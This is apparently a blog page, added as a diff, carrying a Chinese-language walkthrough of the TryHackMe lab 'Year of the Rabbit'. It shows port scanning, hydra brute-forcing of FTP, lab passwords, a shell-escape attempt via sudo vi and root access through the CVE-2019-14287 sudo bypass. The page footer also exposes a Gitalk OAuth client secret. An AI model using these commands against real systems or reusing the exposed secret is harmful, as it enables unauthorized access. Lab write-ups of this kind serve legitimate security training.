@@ -1,0 +1,314 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>TryHackMe | Year of the Rabbit | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="TryHackMe | Year of the Rabbit | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="信息收集
+nmap -T4 -A -v -Pn 10.10.238.0
+
+
+除了web服务，还开了ssh 和 ftp，ftp尝试了需要登陆用户
+dirsearch扫一下web目录
+
+访问/assets/路径
+
+除了一个mp4以外，style..." />
+    <meta name="keywords" content="FTP,TryHackMe,提权" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              TryHackMe | Year of the Rabbit
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-04-19
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/ftp/" class="post-tag">
+                  # FTP
+                </a>
+              
+                <a href="https://le1a.github.io/tag/tryhackme/" class="post-tag">
+                  # TryHackMe
+                </a>
+              
+                <a href="https://le1a.github.io/tag/ti-quan/" class="post-tag">
+                  # 提权
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="信息收集">信息收集</h1>
+<pre><code class="language-bash">nmap -T4 -A -v -Pn 10.10.238.0
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/19/148b74d3cb28e.png" alt="1681904200877.png" loading="lazy"></figure>
+<p>除了web服务，还开了ssh 和 ftp，ftp尝试了需要登陆用户</p>
+<p>dirsearch扫一下web目录</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/19/e667ffd9b67ea.png" alt="1681905018023.png" loading="lazy"></figure>
+<p>访问/assets/路径</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/19/9cf6a44223901.png" alt="1681905018024.png" loading="lazy"></figure>
+<p>除了一个mp4以外，style.css提示了<code>/sup3r_s3cr3t_fl4g.php</code></p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/19/3b80bee2611c4.png" alt="1681905134007.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/19/170b4f4be363b.png" alt="1681905183726.png" loading="lazy"></figure>
+<p>302跳转了，抓个包看看</p>
+<pre><code class="language-html">&lt;html&gt;
+	&lt;head&gt;
+		&lt;title&gt;sup3r_s3cr3t_fl4g&lt;/title&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+		&lt;noscript&gt;Love it when people block Javascript...&lt;br&gt;&lt;/noscript&gt;
+		&lt;noscript&gt;This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!&lt;br&gt;Make sure your audio is turned up!&lt;br&gt;&lt;/noscript&gt;
+		&lt;script&gt;
+			alert(&quot;Word of advice... Turn off your javascript...&quot;);
+			window.location = &quot;https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1&quot;;
+		&lt;/script&gt;
+		&lt;video controls&gt;
+			&lt;source src=&quot;/assets/RickRolled.mp4&quot; type=&quot;video/mp4&quot;&gt;
+		&lt;/video&gt;
+	&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>发现隐藏目录 <code>/WExYY2Cv-qU</code></p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/19/2436ba9c87e83.png" alt="1681905644927.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/19/c342035bd73f5.png" alt="1681905407880.png" loading="lazy"></figure>
+<p>得到一张图片，在图片末尾给出了ftp的用户名和密码字典</p>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/19/955982d789d73.png" alt="1681905467653.png" loading="lazy"></figure>
+<h1 id="爆破ftp密码">爆破ftp密码</h1>
+<p>提取出密码保存为txt，使用hydra爆破ftp密码</p>
+<pre><code class="language-bash">hydra -l ftpuser -P wordlist.txt 10.10.238.0 ftp
+</code></pre>
+<p>得到密码为<code>5iez1wGXKfPKQ</code>，登陆ftp</p>
+<pre><code class="language-bash">ftp 10.10.238.0
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/19/f189770a4a655.png" alt="1681905826056.png" loading="lazy"></figure>
+<p>直接get到本地</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/19/3c0bd5414ab6f.png" alt="1681905883989.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/19/a89c7f401e09f.png" alt="1681905912492.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/19/2c5a5df5e87f9.png" alt="1681905927482.png" loading="lazy"></figure>
+<p>得到ssh密码：<code>eli/DSpDiM1wAEwid</code></p>
+<h1 id="登陆ssh">登陆SSH</h1>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/19/78c3f1bab1c2a.png" alt="1681906362107.png" loading="lazy"></figure>
+<p>登陆ssh,并发现了<code>/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!</code></p>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/19/7eab360433cde.png" alt="1681906428664.png" loading="lazy"></figure>
+<p>得到另一个用户的密码 <code>gwendoline/MniVCQVhQHUNI</code></p>
+<figure data-type="image" tabindex="15"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/19/35894729f6adc.png" alt="1681906497255.png" loading="lazy"></figure>
+<h1 id="提权">提权</h1>
+<p><code>sudo -l</code>发现当前用户可以使用root权限编辑<code>/home/gwendoline/user.txt</code></p>
+<figure data-type="image" tabindex="16"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/19/fefdadb6564d8.png" alt="1681906716909.png" loading="lazy"></figure>
+<pre><code class="language-bash">sudo vi -c ':!/bin/sh' /dev/null
+</code></pre>
+<blockquote>
+<p>Sorry, user gwendoline is not allowed to execute '/usr/bin/vi -c :!/bin/sh /dev/null' as root on year-of-the-rabbit.</p>
+</blockquote>
+<p>失败了。。。</p>
+<h2 id="cve-2019-14287">CVE-2019-14287</h2>
+<p>CVE-2019-14287是一个Linux系统中Sudo软件的漏洞，影响版本为1.7.1到1.8.28。该漏洞允许非特权用户（在sudoers文件中没有明确声明）以root权限运行命令。</p>
+<p>该漏洞的根本原因是在执行sudo -u#-1命令时，sudo会将uid参数解析为-1，并将其视为0。由于通常情况下，uid=0表示root用户，因此攻击者可以使用这种方式来绕过sudo的访问控制，从而以root权限执行命令。</p>
+<pre><code class="language-bash">sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
+</code></pre>
+<figure data-type="image" tabindex="17"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/19/002d5be0e1a02.png" alt="1681907093548.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/19/e9203d11f0078.png" alt="1681907133573.png" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li>
+<li><a href="#%E7%88%86%E7%A0%B4ftp%E5%AF%86%E7%A0%81">爆破ftp密码</a></li>
+<li><a href="#%E7%99%BB%E9%99%86ssh">登陆SSH</a></li>
+<li><a href="#%E6%8F%90%E6%9D%83">提权</a>
+<ul>
+<li><a href="#cve-2019-14287">CVE-2019-14287</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/szsafeXxME/">
+              <h3 class="post-title">
+                2023数字中国创新大赛 XxMe
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
